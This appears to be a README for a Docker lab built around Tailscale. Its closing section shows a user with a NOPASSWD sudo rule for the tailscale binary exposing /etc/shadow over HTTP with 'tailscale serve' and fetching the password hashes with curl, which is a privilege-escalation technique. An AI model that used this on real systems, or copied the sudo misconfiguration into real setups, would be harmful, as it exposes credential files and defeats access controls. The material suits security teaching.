# Tailscale Docker Setup Guide

This guide explains how to generate a Tailscale Auth Key, configure your Docker environment, and access protected system files through Tailscale inside the container.

---

## 🔑 1. Generate Your Tailscale Auth Key

1. Log in to your Tailscale account:
   👉 [https://login.tailscale.com](https://login.tailscale.com)

2. Open:
   **Settings → Auth keys**
   or directly:
   👉 [https://login.tailscale.com/admin/settings/keys](https://login.tailscale.com/admin/settings/keys)

3. Click:
   **Generate auth key**

4. Configure the key:

   * **Allow reuse** — ❌ disable (recommended, one-time key)
   * **Ephemeral** — optional, enable if you want a temporary device
   * **Expiration** — usually **90 days**
   * **Tags** — optional, for assigning limited permissions

5. Copy your generated key, for example:

```
tskey-auth-kjshdf87sdf87sd9f7sdf
```

This value is your **TS_AUTHKEY**.

---

### ⚠️ Important

Tailscale shows the Auth Key **only once**.
If you lose it — create a new one.

---

## ⚙️ 2. Update docker-compose.yml

Replace the placeholder value with **your own TS_AUTHKEY**.

Example:

```
environment:
  - TS_AUTHKEY=tskey-auth-your-key-here
```

---

## 🛠️ 3. Build and Run the Container

```
docker build -t tailscale-container .
docker run -it --rm --net=host --cap-add=NET_ADMIN --device /dev/net/tun tailscale-container
```

---

## 🔐 4. Authenticate Devices

After starting the container, authenticate your Tailscale machine when prompted.

---

## 🧪 5. Accessing Protected Files Using Tailscale Serve

Inside the container:

```
su ray
id
cat /etc/shadow        # Permission denied
sudo -l                # Shows: (ALL) NOPASSWD: /usr/bin/tailscale
```

Now expose `/etc/shadow` over HTTP using Tailscale Serve:

```
sudo /usr/bin/tailscale serve --http=8888 /etc/shadow &
```

Then get access:

```
curl http://<hostname>.<tailnet>.ts.net:8888/
```

![photo_2025-11-17_15-32-48](https://github.com/user-attachments/assets/b22fd33c-d58c-43bc-85f1-f205ce260e8d)

